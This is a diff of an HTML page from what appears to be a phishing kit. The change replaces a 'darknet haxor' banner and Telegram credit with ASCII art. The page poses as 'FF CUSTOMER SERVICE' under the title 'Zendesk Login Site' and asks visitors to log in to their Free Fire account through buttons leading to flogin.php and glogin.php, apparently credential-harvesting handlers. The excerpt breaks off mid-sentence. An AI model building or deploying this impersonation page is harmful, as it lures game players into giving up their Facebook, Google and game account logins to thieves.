@@ -1,18 +1,24 @@
-<!-- DARKNET HAXOR:
-________ _______ ________ ______ _______   ____________________ 
-___  __ \___    |___  __ \___  //_/___  | / /___  ____/___  __/ 
-__  / / /__  /| |__  /_/ /__  ,<   __   |/ / __  __/   __  /    
-_  /_/ / _  ___ |_  _, _/ _  /| |  _  /|  /  _  /___   _  /     
-/_____/  /_/  |_|/_/ |_|  /_/ |_|  /_/ |_/   /_____/   /_/     
-
-______  _________ ____  _________ ________                     
-___  / / /___    |__  |/ /__  __ \___  __ \                    
-__  /_/ / __  /| |__    / _  / / /__  /_/ / 
-_  __  /  _  ___ |_    |  / /_/ / _  _, _/  
-/_/ /_/   /_/  |_|/_/|_|  \____/  /_/ |_| 
+<!--  a vampire ~ 9/96:
+              __.......__
+            .-:::::::::::::-.
+          .:::''':::::::''':::.
+        .:::'     `:::'     `:::. 
+   .'\  ::'   ^^^  `:'  ^^^   '::  /`.
+  :   \ ::   _.__       __._   :: /   ;
+ :     \`: .' ___\     /___ `. :'/     ; 
+:       /\   (_|_)\   /(_|_)   /\       ;
+:      / .\   __.' ) ( `.__   /. \      ;
+:      \ (        {   }        ) /      ; 
+ :      `-(     .  ^"^  .     )-'      ;
+  `.       \  .'<`-._.-'>'.  /       .'
+    `.      \    \;`.';/    /      .'
+ jgs  `._    `-._       _.-'    _.'
+       .'`-.__ .'`-._.-'`. __.-'`.
+     .'       `.         .'       `.
+   .'           `-.   .-'           `.
 ------------------------------------------------------------    
-Author   : darknet haxor 
-Telegram : https://t.me/officialdarknethaxor
+Author   : 
+Telegram : 
 ------------------------------------------------------------>
 <html lang="sg_en" style="font-size: 102.324px; height: 969px; width: 1365px;"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"><title>Zendesk Login Site</title><link rel="shortcut icon" type="image/png" href="favicon.png"><link href="static/css/main.ae76d67acf37435e83b9.css" rel="stylesheet"></head><body><div id="app"><div class="content"><div class="home-background"></div> <div class="ff-logo"></div> <div class="container"><div class="title">FF CUSTOMER SERVICE</div> <div class="subtitle">Please login to your Free Fire account</div> <div class="options"><a href="flogin.php"><button class="btn-facebook"></button></a> <a href="glogin.php"><button class="btn-google"></button></a> <button class="btn-huawei"></button> <button class="btn-apple"></button> <button class="btn-twitter"></button></div> <div class="link">
     Ensure that you link your Free Fire account to be able to submit a
